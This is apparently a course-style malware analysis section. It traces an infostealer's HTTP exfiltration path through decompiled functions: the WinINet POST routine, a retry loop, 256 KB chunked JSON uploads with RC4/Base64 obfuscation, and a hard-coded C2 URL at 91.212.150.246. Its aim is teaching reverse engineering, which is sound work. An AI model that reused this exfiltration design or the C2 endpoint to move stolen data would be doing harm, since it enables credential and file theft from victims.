## The HTTP Exfiltration Path — `FUN_14000c508` and its wrappers

This is where the collected data actually leaves the machine. Students should approach it top-down: the module code doesn't call WinINet directly — it hands a finished string to a small stack of wrappers that chunk it, envelope it, and POST it.

### 1. The core POST routine — `FUN_14000c508`

We flagged this in the triage. Open it and walk the WinINet call chain — note that **none of these are in the import table**; they're all called through the `DAT_1400bcXX` pointers filled in by the resolver (`FUN_140040580`):

```c
lVar4 = (*DAT_1400bce18)(&DAT_140084968, 0, 0, 0, ...);        // InternetOpenW  (UA = "..."/UNKNOWN)
(*DAT_1400bce30)(lVar4, 2, ...);                               // InternetSetOptionA
local_11a0 = (*DAT_1400bce28)(lVar4, param_2, <port>, ...);    // InternetConnectW  (host, port)
lVar5 = (*DAT_1400bcdf8)(local_11a0, L"POST", param_3, ...);   // HttpOpenRequestW ("POST", path)
...
FUN_14000f72c(&local_11d0, L"Content-Type: application/json\r\n", ...);  // request header
iVar3 = (*DAT_1400bcdd8)(lVar5, <headers>, ..., param_5, ...); // HttpSendRequestW (body = param_5)
...
(*DAT_1400bcde0)(lVar5, 0x13, &local_1128, ...);              // HttpQueryInfoA (0x13 = STATUS_CODE)
// manual atoi of the status string:
while (local_1128 != '\0') { iVar10 = local_1128 - 0x30 + iVar10*10; ... }
if (iVar10 != 200) { ...return empty... }                    // only proceed on HTTP 200
(*DAT_1400bce10)(lVar5, local_1028, 0x1000);                 // InternetReadFile (response)
puVar7 = FUN_140025fd4(...);                                  // base64-decode response
FUN_140025c04(&local_1168, &DAT_1400b8620, puVar7);          // RC4-decrypt response (same key)
```

Key takeaways for students:
- **Host** comes in as `param_2`, **URL path** as `param_3`, **body** as `param_5` — the caller supplies the decoded C2 URL pieces (`http://91.212.150.246` + `/85e1d65ca2fa44acae49.php`).
- Body content type is `application/json`.
- It checks for **HTTP 200** before using the response.
- The **response is Base64+RC4-decoded with the same key** we recovered — so C2 replies (task config, "waiting"/"success"/"missing" states) are obfuscated the same way as the embedded strings. That closes the loop with the config parser from section 04.

### 2. The send wrapper / retry loop — `FUN_14000cac0`

The module functions call `FUN_14000cac0`, not `FUN_14000c508` directly. This wrapper:
- Splits the target into host/path (`FUN_14003e8a4` / `FUN_14000abc4`), bailing if the host resolves to `UNKNOWN`.
- Wraps the POST in a **retry loop**:
  ```c
  do {
      ppppuVar3 = FUN_14000c508(local_28, local_90, local_70, ..., param_3);  // POST
      ... copy response into local_b8 ...
      iVar1 = (*DAT_1400bcd60)(response, "Unknown");   // StrStrA(response, "Unknown")
  } while (iVar1 == 0);
  ```
  `DAT_1400bcd60` is the resolved `StrStrA`, and the marker string (`DAT_1400ba200`) decodes to **`Unknown`**. So the client keeps re-POSTing until the server's reply contains the expected marker — a crude application-layer ACK / keep-trying mechanism.

### 3. The chunking / envelope builder — `FUN_14000ade8`

Large stolen blobs (browser DBs, Foxmail `.rec0`, screenshots) don't go in one POST. `FUN_14000ade8` (which we saw called from the Foxmail and browser modules) is the **multipart uploader**. Inside it you'll find the JSON template built field-by-field with the decoded keys:

```
{ "total_parts": <N>, "part_index": <i>, "<key>": "<value>", ... "filename": "...", "data": "<chunk>" }
```

- It computes `total_parts` by dividing the payload into `0x40000`-byte (256 KB) chunks (`(size + 0x3ffff) >> 0x12`).
- For each chunk it builds a JSON object carrying `total_parts` / `part_index` / `filename` / the Base64+RC4-encoded `data`, then calls the send wrapper.
- It inspects each response for `"success"`, `"waiting"`, or `"missing"` states — `missing` triggers re-sending the specific parts the server says it didn't get. That's a genuine **reliable chunked-upload protocol**, not just fire-and-forget.

### 4. Helper: `FUN_14000e228`

Minor but worth naming: `FUN_14000e228` just copies a `[begin,end)` byte range into a fresh heap buffer (small-buffer vs. large-alloc split at `0x1000`). It's the "materialize this data range for sending" helper the enveloper leans on — not itself interesting, but students will see it constantly and should recognize it as plumbing, not logic.

### 5. Putting the exfil path together

```
theft module (e.g. Foxmail FUN_1400098e8)
        │  collected data + target name
        ▼
FUN_14000ade8  ── chunk into 256KB parts, build JSON {total_parts, part_index, filename, data(base64+RC4)}
        │
        ▼
FUN_14000cac0  ── split host/path, retry-until-"Unknown"-marker loop
        │
        ▼
FUN_14000c508  ── InternetOpenW → InternetConnectW → HttpOpenRequestW(POST)
                  → HttpSendRequestW(Content-Type: application/json)
                  → HttpQueryInfoA(status==200?) → InternetReadFile
                  → base64-decode + RC4-decrypt the response
        │
        ▼
  C2: http://91.212.150.246/85e1d65ca2fa44acae49.php
```

### 6. Discipline note

This confirms, at the code level, a **complete HTTP(S) exfiltration capability** with a real chunked-upload protocol and matching request/response obfuscation — statically reachable and wired to the decoded C2 endpoint. What static analysis still can't tell you: whether the C2 is live, what tasking it actually returns, or whether any given run successfully exfiltrates. Confirming the endpoint is active and capturing real traffic is a **dynamic / network-analysis** step — and one to do carefully, since beaconing to a live C2 has OPSEC implications (it tips off the operator). Keep the artifact-vs-behavior line clear in the writeup.
